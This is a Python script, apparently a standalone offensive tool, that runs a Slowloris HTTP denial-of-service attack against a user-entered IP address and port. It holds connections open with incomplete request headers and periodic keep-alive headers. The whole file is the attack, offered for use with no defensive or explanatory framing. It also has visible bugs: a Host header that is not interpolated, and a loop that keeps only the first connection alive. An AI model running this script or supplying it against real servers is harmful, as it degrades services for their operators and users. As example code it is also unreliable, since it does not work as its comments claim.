#!/usr/bin/env python3
# HTTP Denial of Service

import socket
import random
import time
import threading
import sys
import signal

# Global flag to handle graceful termination
running = True

def signal_handler(sig, frame):
    """Graceful exit handler."""
    global running
    print("\n🛑 Received exit signal!")
    running = False
    sys.exit(0)

def slowloris_attack(target_ip, target_port, duration, max_connections):
    """
    Slowloris HTTP DoS Attack
    Keeps connections open by sending incomplete HTTP requests to the target server
    """
    headers = [
        "GET / HTTP/1.1\r\n",
        "Host: {target_ip}\r\n",
        "User-Agent: Slowloris-DoS\r\n",
        "Connection: keep-alive\r\n",
        "Content-Length: 10000\r\n\r\n"
    ]
    # Attempt to open 'max_connections' connections and keep them open by sending incomplete data
    connections = []

    while running:
        try:
            for _ in range(max_connections):
                client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                client_socket.connect((target_ip, target_port))
                connections.append(client_socket)
                
                # Send the incomplete HTTP request headers
                for header in headers:
                    client_socket.send(header.encode())
                
                print(f"💥 Sending incomplete HTTP request to {target_ip}:{target_port}")
                
                # Keep the connection alive by sending small chunks of data
                while running:
                    time.sleep(10)  # Send small chunks to keep the connection open
                    client_socket.send("X-a: b\r\n".encode())  # Keep alive headers
        except Exception as e:
            print(f"Error: {e}")

def main():
    global running

    # Signal handler for graceful termination
    signal.signal(signal.SIGINT, signal_handler)

    # Get user input for the attack configuration
    target_ip = input("Enter the target IP address: ").strip()
    target_port = int(input("Enter the target port (e.g., 80 for HTTP): ").strip())
    duration = int(input("Enter the attack duration in seconds: ").strip())
    max_connections = int(input("Enter the number of connections to attempt: ").strip())

    print(f"\n🔧 Attack Configuration:")
    print(f"   • Target: {target_ip}:{target_port}")
    print(f"   • Duration: {duration}s")
    print(f"   • Max Connections: {max_connections}")

    start_time = time.time()

    try:
        # Start the Slowloris attack
        slowloris_attack(target_ip, target_port, duration, max_connections)
        
        # Wait for the attack to complete
        while running and (time.time() - start_time < duration):
            elapsed = time.time() - start_time
            print(f"\rElapsed time: {elapsed:.1f}s", end='', flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n🛑 Attack interrupted by user!")

    # Gracefully terminate the attack
    running = False
    print(f"\n\n📊 Attack completed. Duration: {time.time() - start_time:.1f}s")

if __name__ == "__main__":
    main()
